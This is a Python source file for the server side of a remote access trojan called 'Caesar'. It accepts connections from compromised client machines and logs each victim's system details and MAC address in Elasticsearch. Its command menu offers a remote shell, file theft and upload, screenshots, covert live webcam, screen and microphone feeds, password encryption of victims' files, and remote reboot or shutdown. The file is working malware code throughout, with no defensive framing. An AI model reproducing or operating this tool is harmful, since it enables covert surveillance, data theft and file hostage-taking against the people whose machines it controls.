import os
import re
import json
import time
import struct
import socket
import threading
from queue import Queue
from datetime import datetime
from es_handler import EsHandler
from client_handler import ClientHandler
from getmac import get_mac_address as gma



class Caesar:

        def __init__(self, host, port, db_name, es_url, client_folder_name):
            self.host = host
            self.port = port
            self.sock = None
            self.queue = Queue()
            self.socket_object_dict = {}
            self.current_session_id = str()
            self.clientHandler = ClientHandler()
            self.clientFolder = client_folder_name
            self.esHandler = EsHandler(db_name, es_url)


        # create socket and listen for connections
        def create_socket(self):
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.bind((self.host, self.port))
                self.sock.listen(20) #listen for connection
            except socket.error as err:
                print(f"[-]Error unable to create socket {str(err)}")


        # handles incoming connections
        def handle_connections(self):
            while True:

                try:
                    conn, addr = self.sock.accept()
                    conn.setblocking(True)
                    client_info = conn.recv(1024).decode()# recieves client system information
                    ip = re.findall("'(.*?)'", str(addr))# extract ip from addr
                    ip = "".join(ip)

                    # check if connected client already exists in ES index
                    if (self.esHandler.is_conn_present(str(json.loads(client_info)['mac-address']))):
                        client_id = self.esHandler.update_document(str(json.loads(client_info)['mac-address']), ip, client_info)
                        self.socket_object_dict.update({client_id:conn})

                        path = os.path.join(self.clientFolder, str(client_id))
                        if not os.path.exists(path):
                            os.mkdir(path)

                        print(f"\n[+]Node {ip} has reconnected!")


                    # create a new ES document if the client does not exist
                    else:
                        client_conn_dict = self.esHandler.store_client_information(ip, conn, client_info)
                        client_id = next(iter(client_conn_dict))

                        path = os.path.join(self.clientFolder, str(client_id))
                        if not os.path.exists(path):
                            os.mkdir(path) # create a folder for new client using their ES client ID

                        self.socket_object_dict.update(client_conn_dict)
                        print(f"\n[+]Node {ip} has connected!")

                except Exception as e:
                    print(e)
                    # print("[-]Something went wrong connecting to client!!!")
                    break


        # displays caesar shell commands
        def show_commands(self):
            user_guide = """
                Caesar Commands
                     'guide': ['Display Caesar's user commands']
                     'clients':['lists clients within ES index']
                     'connected':['lists all active connection within ES index']
                     'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine']
                     'delete (target ES Client_ID)': ['remove specified document from index']
                     'delete all': ['remove all document from index']
                     'get (target ES Client_ID)': ['retrieves indexed data of specified target']
                     'show fields (target ES Client_ID)': ['displays existing field for specified target']
                     'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']

                Client Commands                                                
                    'quit':['quits the session and takes user back to Caesar ES interface']           
                    'get (filename or path)':['Receieve specified file from target client']
                    'send (filename or absolute path)':['send specified file to the target client']      
                    'screenshot':['takes a screen shot of the client machine']
                    'camshot':['captures an image from the client's webcam']  
                    'camfeed': ['live feed from target's webcam']
                    'screenfeed': ['live feed from target's screen']
                    'audiofeed': ['live audio feed from target's microphone']
                    'encrypt (PASSWORD) (FILENAME)': ['encrypts specified file']            
                    'decrypt (PASSWORD)(FILENAME)': ['decrypts specified file']   
                    'reboot' : ['reboot client system']
                    'shutdown' : ['shutdown client system']
            """
            print(user_guide)



         # format text to bold and blue 
        def convert_caesar_text(self, text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"


        #returns socket connection object 
        def get_socket_obj(self, client_id):
            try:
                for clients, socket_obj in self.socket_object_dict.items():
                    if clients == client_id:
                        return socket_obj
                        break
            except:
                print("[-]ID does not exists!!! ")



        # sends null to the client and get the current working directory in return
        def send_null(self, client_sock_object):
                client_sock_object.send(str(" ").encode())
                data = client_sock_object.recv(1024).decode()
                print(str(data), end="")



        # sends commands to the client
        def handle_client_session(self, client_id, client_sock_object):
                self.send_null(client_sock_object)
                self.current_session_id = client_id


                while True:
                    cmd = ""
                    cmd = input()
                    cmd = cmd.rstrip()

                    if cmd.strip()== 'quit':
                        print("[+]Closing Session!!!!....")
                        self.current_session_id = ""
                        break

                    elif cmd == "":
                        self.send_null(client_sock_object)

                    elif cmd == "guide":
                        self.show_commands()
                        self.send_null(client_sock_object)

                    elif "get" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            usrFile = client_sock_object.recv(1024).decode()
                            data = client_sock_object.recv(1024).decode()
                            if "File does not exist!!!" not in data:
                                self.clientHandler.receive_file(client_sock_object, self.clientFolder, self.current_session_id, usrFile)
                                print(str(data), end="")
                            else:
                                print(data)
                        except Exception as e:
                            print(e)
                            print("[-]Connection terminated!!!")
                            break

                    elif "send" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            self.clientHandler.send_file(client_sock_object, cmd[5:])
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print(e)
                            print("[-]Connection terminated!!!")
                            break
                    elif cmd.strip() == "camshot":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "camfeed":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.live_webcam_feed(client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "screenshot":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.receive_client_image(self.clientFolder, self.current_session_id, client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print(e)
                            print("[-]Connection terminated!!!")
                            break
                    elif cmd.strip() == "screenfeed":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.live_screen_feed(client_sock_object)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "audiofeed":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            self.clientHandler.live_audio_feed(client_sock_object, self.clientFolder, self.current_session_id)
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif "encrypt" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif "decrypt" in cmd:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break

                    elif cmd.strip() == "reboot":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    elif cmd.strip() == "shutdown":
                        try:
                            cmd = cmd.strip()
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(1024).decode()
                            print(str(data), end="")
                        except Exception as e:
                            print("[-]Connection terminated!!!")
                            print(e)
                            break
                    else:
                        try:
                            client_sock_object.send(str(cmd).encode())
                            data = client_sock_object.recv(65536).decode()
                            print(str(data), end="")
                        except:
                            print("[-]Connection terminated!!!")
                            break



        # shell interface
        def shell_interface(self):
                while True:
                    print(self.convert_caesar_text("Caesar: "), end="")
                    cmd = input()
                    cmd = cmd.rstrip()

                    if cmd == '':
                        pass
                    elif cmd.strip() == 'clients':
                        self.esHandler.retrieve_client_information()

                    elif 'show fields' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 3:
                            client_id = cmd[2]
                            self.esHandler.show_fields(client_id)
                        else:
                            print("[-]Invalid use of the show field command")            

                    elif cmd.strip() == 'guide':
                        self.show_commands()

                    elif 'get' in cmd:
                        client_id = cmd[4:]
                        self.esHandler.retrieve_client_document(client_id)

                    
                    elif 'delete all' in cmd:
                        self.esHandler.delete_all_docs()
                        self.socket_object_dict.clear()

                    elif 'delete' in cmd:
                        client_id = cmd[7:]
                        self.esHandler.delete_client_document(client_id)
                        if(client_id in self.socket_object_dict):
                            self.socket_object_dict.pop(client_id)


                    elif 'field' in cmd:
                        cmd = cmd.split()
                        if len(cmd) == 3:          
                            client_id = cmd[1]
                            parameter = cmd[2]
                            self.esHandler.get_field(client_id, parameter)
                        else:
                            print("[-]Invalid use of the field command")


                    elif cmd.strip() == 'connected':
                        self.esHandler.get_connected_client(self.socket_object_dict)

                    elif 'shell' in cmd:
                        client_id = cmd[6:]
                        current_session_id = client_id
                        client_sock_object = self.get_socket_obj(client_id)

                        # check if connection is still active
                        if(bool(self.socket_object_dict)):
                            try:
                                client_sock_object.send("conn check".encode())
                                self.handle_client_session(client_id, client_sock_object)
                            except Exception as e:
                                
                                print("[-]Client connection is not active!!!")
                        else:
                            print("[-]No connection is active!!!")

                    else:
                        print("[-]Invalid command!!!")


        
        def thread_handler(self):
            for task_number in [1, 2]:
                thread = threading.Thread(target=self.handle_connections if task_number == 1 else self.shell_interface)
                if task_number == 1:
                    thread.daemon = True
                thread.start()


        def start(self):
            self.create_socket()
            self.thread_handler()

